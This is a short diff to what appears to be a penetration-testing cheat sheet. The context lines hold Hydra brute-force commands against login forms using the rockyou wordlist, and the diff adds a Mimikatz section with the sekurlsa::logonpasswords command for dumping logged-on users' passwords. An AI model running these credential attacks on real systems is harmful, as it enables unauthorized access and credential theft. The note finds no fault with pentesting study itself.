@@ -20,6 +20,7 @@
     - [SSH - Hydra](#ssh---hydra)
     - [HTTP POST Login Form - Hydra](#http-post-login-form---hydra)
     - [HTTP GET Login Form - Hydra](#http-get-login-form---hydra)
+  - [Mimikatz usage](#mimikatz-usage)
 
 ## Generate World list
 
@@ -119,4 +120,11 @@ hydra -l <user> -P /usr/share/wordlists/rockyou.txt <IP> http-post-form "/login.
 ### HTTP GET Login Form - Hydra
 ```
 hydra -l <username> -P /usr/share/wordlists/rockyou.txt -f <IP> http-get /login
+```
+
+## Mimikatz usage
+
+Display logged on users passowrds
+```
+sekurlsa::logonpasswords
 ```
